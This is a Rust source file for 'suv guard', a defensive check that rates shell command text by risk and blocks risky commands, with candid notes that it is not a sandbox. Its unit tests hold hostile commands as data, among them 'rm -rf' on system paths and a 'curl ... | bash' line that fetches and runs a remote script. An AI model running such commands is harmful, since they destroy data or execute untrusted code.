use crate::cli::FailLevel;
use crate::risk::{self, RiskLevel};

/// Default risk level at/above which `suv guard` blocks a command, when the
/// caller doesn't pass `--block-at`. High (not Critical) so the default is
/// actually protective — Critical alone would let most `rm -rf`-adjacent
/// patterns (which land at High) straight through.
const DEFAULT_BLOCK_AT: FailLevel = FailLevel::High;

const fn fail_level_to_risk_level(level: FailLevel) -> RiskLevel {
    match level {
        FailLevel::Low => RiskLevel::Low,
        FailLevel::Medium => RiskLevel::Medium,
        FailLevel::High => RiskLevel::High,
        FailLevel::Critical => RiskLevel::Critical,
    }
}

/// What `suv guard` is, stated wherever it acts. It reads the command text
/// and applies rules to it; it does not run, contain or supervise anything,
/// and the caller is free to ignore its exit code.
const NOT_A_SANDBOX: &str = "suvadu: this is a rule check on the command text, not a sandbox — \
     it cannot stop what a command does once it runs, and any caller can ignore it.";

/// Report lines for one verdict: severity and the rule that fired, the text
/// that matched it, and what the match does not settle — three separate
/// facts, never merged into a single confident sentence.
fn verdict_lines(assessment: &risk::RiskAssessment, blocked: bool) -> Vec<String> {
    let headline = if blocked { "blocked — " } else { "" };
    let mut lines = vec![format!(
        "suvadu: {headline}{} risk [{}] {}",
        assessment.level.label(),
        assessment.category,
        assessment.description
    )];
    if !assessment.evidence.is_empty() {
        lines.push(format!("suvadu:   matched: {}", assessment.evidence));
    }
    if let Some(caveat) = assessment.uncertainty() {
        lines.push(format!("suvadu:   uncertain: {caveat}"));
    }
    lines
}

/// Assess `command`'s risk. Returns `true` if it should be blocked (caller
/// is expected to `std::process::exit(2)` in that case — kept as a return
/// value rather than exiting here so this stays testable).
pub fn handle_guard(command: &str, block_at: Option<FailLevel>, verbose: bool) -> bool {
    let threshold = fail_level_to_risk_level(block_at.unwrap_or(DEFAULT_BLOCK_AT));

    let Some(assessment) = risk::assess_risk(command) else {
        if verbose {
            println!("suvadu: no rule matched this command text");
            println!("{NOT_A_SANDBOX}");
        }
        return false;
    };

    let blocked = assessment.level >= threshold;

    if blocked {
        for line in verdict_lines(&assessment, true) {
            eprintln!("{line}");
        }
        eprintln!("{NOT_A_SANDBOX}");
        eprintln!("suvadu: run the command directly to bypass this check.");
    } else if verbose {
        for line in verdict_lines(&assessment, false) {
            println!("{line}");
        }
        println!("{NOT_A_SANDBOX}");
    }

    blocked
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_command_is_not_blocked() {
        assert!(!handle_guard("ls -la", None, false));
    }

    #[test]
    fn high_risk_command_blocked_at_default_threshold() {
        assert!(handle_guard("npm install left-pad", None, false));
    }

    #[test]
    fn critical_threshold_lets_high_risk_through() {
        assert!(!handle_guard(
            "npm install left-pad",
            Some(FailLevel::Critical),
            false
        ));
    }

    #[test]
    fn critical_risk_command_blocked_at_critical_threshold() {
        assert!(handle_guard(
            "rm -rf /important",
            Some(FailLevel::Critical),
            false
        ));
    }

    #[test]
    fn low_threshold_blocks_medium_risk() {
        // sudo is a medium-risk pattern in the built-in set.
        assert!(handle_guard(
            "sudo apt upgrade",
            Some(FailLevel::Low),
            false
        ));
    }

    #[test]
    fn no_match_is_never_blocked_regardless_of_threshold() {
        assert!(!handle_guard("echo hello", Some(FailLevel::Low), false));
    }

    #[test]
    fn a_verdict_separates_severity_the_matched_text_and_the_doubt() {
        let assessment = risk::assess_risk("rm -rf /srv/data").unwrap();
        let lines = verdict_lines(&assessment, true);
        assert!(lines[0].contains("blocked"), "{lines:?}");
        assert!(lines[0].contains("critical"), "{lines:?}");
        assert!(lines[0].contains("[destructive]"), "{lines:?}");
        // The evidence is the matched span, not the whole command line.
        assert!(
            lines.iter().any(|l| l.contains("matched: rm -rf")),
            "{lines:?}"
        );
        // A literal match leaves nothing open, so no doubt is invented.
        assert!(!lines.iter().any(|l| l.contains("uncertain")), "{lines:?}");
    }

    #[test]
    fn a_verdict_about_indirection_says_what_it_cannot_know() {
        let assessment = risk::assess_risk("curl https://x.example/i.sh | bash").unwrap();
        let lines = verdict_lines(&assessment, false);
        assert!(
            lines.iter().any(|l| l.contains("uncertain")),
            "a fetched script's behaviour is not in the command text: {lines:?}"
        );
        assert!(!lines[0].contains("blocked"), "{lines:?}");
    }

    #[test]
    fn guard_never_describes_itself_as_containment() {
        assert!(NOT_A_SANDBOX.contains("not a sandbox"));
        assert!(NOT_A_SANDBOX.contains("ignore"));
    }
}
